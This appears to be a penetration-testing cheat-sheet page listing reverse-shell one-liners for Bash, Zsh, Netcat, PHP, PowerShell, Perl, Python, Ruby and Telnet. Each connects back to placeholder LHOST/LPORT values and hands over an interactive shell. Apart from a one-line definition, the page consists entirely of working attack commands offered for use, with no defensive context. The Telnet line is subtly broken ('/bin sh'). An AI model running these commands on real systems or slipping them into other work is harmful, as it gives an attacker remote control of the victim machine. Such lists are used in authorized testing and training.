---
description: >-
  A reverse shell is a shell session established on a connection that is
  initiated from a remote machine, not from the local host.
---

# Reverse shell

### Bash

```bash
bash -c 'exec bash -i &>/dev/tcp/LHOST/LPORT <&1'
```

### Zsh

```bash
zsh -c 'zmodload zsh/net/tcp && ztcp LHOST LPORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

### Netcat

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
```

### PHP

```php
php -r '$sock=fsockopen(getenv("LHOST"),getenv("LPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Powershell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Perl

```perl
perl -e 'use Socket;$i="$ENV{LHOST}";$p=$ENV{LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Ruby

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["LHOST"],ENV["LPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Telnet

```bash
TF=$(mktemp -u); mkfifo $TF && telnet LHOST LPORT 0<$TF | /bin sh 1>$TF
```
